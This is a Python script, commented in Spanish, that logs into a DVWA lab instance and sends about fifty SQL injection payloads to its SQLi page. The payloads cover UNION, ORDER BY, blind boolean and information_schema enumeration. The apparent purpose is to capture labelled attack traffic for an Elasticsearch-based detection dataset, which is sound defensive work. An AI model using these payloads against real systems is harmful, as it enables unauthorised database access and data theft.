import requests
import time
import random

# =============================================
# CONFIGURACION
# =============================================
BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# =============================================
# PAYLOADS SQLI ENTRENAMIENTO MEDIUM
# En nivel medium DVWA usa mysql_real_escape_string()
# que escapa comillas simples. Se usan payloads numericos
# sin comillas y tecnicas basadas en operadores numericos.
# DISTINTOS a los de entrenamiento_sqli.py (nivel low)
# =============================================

PAYLOADS_SQLI_MEDIUM = [
    # Payloads numericos sin comillas
    "1 OR 1=1",
    "1 OR 1=2",
    "1 OR 2=2",
    "1 OR 3=3",
    "2 OR 1=1",
    "0 OR 1=1",
    "1 AND 1=1",
    "1 AND 1=2",
    "2 AND 1=1",
    # UNION based sin comillas
    "1 UNION SELECT 1,2",
    "1 UNION SELECT null,null",
    "1 UNION SELECT 1,null",
    "1 UNION SELECT null,1",
    "0 UNION SELECT 1,2",
    "0 UNION SELECT null,null",
    "1 UNION SELECT user(),2",
    "1 UNION SELECT version(),2",
    "1 UNION SELECT database(),2",
    "1 UNION SELECT 1,user()",
    "1 UNION SELECT 1,version()",
    "1 UNION SELECT 1,database()",
    # ORDER BY para enumerar columnas
    "1 ORDER BY 1",
    "1 ORDER BY 2",
    "1 ORDER BY 3",
    "1 ORDER BY 4",
    "2 ORDER BY 1",
    "2 ORDER BY 2",
    # Subqueries numericas
    "1 AND (SELECT 1)=1",
    "1 AND (SELECT 2)=2",
    "1 AND (SELECT 1 FROM users LIMIT 1)=1",
    "1 AND (SELECT COUNT(*) FROM users)>0",
    "1 AND (SELECT COUNT(*) FROM users)>1",
    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
    # Blind boolean
    "1 AND 1=1 LIMIT 1",
    "1 AND 1=2 LIMIT 1",
    "1 AND LENGTH(database())>0",
    "1 AND LENGTH(database())>3",
    "1 AND LENGTH(database())>5",
    "1 AND LENGTH(version())>5",
    # Operadores logicos
    "1 OR id=1",
    "1 OR id=2",
    "1 OR id=3",
    "0 OR id=1",
    "0 OR id=2",
    # UNION con information_schema
    "1 UNION SELECT table_name,2 FROM information_schema.tables LIMIT 1",
    "1 UNION SELECT column_name,2 FROM information_schema.columns LIMIT 1",
    "1 UNION SELECT 1,table_name FROM information_schema.tables LIMIT 1",
    "0 UNION SELECT table_name,table_schema FROM information_schema.tables LIMIT 1",
    "0 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables",
]

# =============================================
# FUNCIONES
# =============================================

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_sqli_medium(session):
    print("\n[*] Iniciando ataques SQLi MEDIUM...")
    payloads = PAYLOADS_SQLI_MEDIUM.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            # En medium el formulario es POST
            r = session.post(f"{BASE_URL}/vulnerabilities/sqli/",
                             data={"id": payload, "Submit": "Submit"})
            print(f"  SQLi_M | {payload[:50]:<50} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] SQLi Medium completado: {ok}/{len(payloads)} peticiones enviadas")

# =============================================
# MAIN
# =============================================

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

    print("="*60)
    print("  ENTRENAMIENTO: SQL INJECTION — NIVEL MEDIUM")
    print("  Target: " + BASE_URL)
    print("  Etiqueta Elasticsearch: 'sqli'")
    print("  AVISO: Asegurate de que DVWA esta en nivel MEDIUM")
    print("  AVISO: Asegurate de tener tcpdump corriendo en el router")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")

    if not login(session):
        exit(1)

    ataque_sqli_medium(session)

    print("\n" + "="*60)
    print("  COMPLETADO.")
    print("  Para el tcpdump, guarda el pcap y subelo a Elasticsearch")
    print("  con etiqueta: 'sqli'")
    print("="*60)
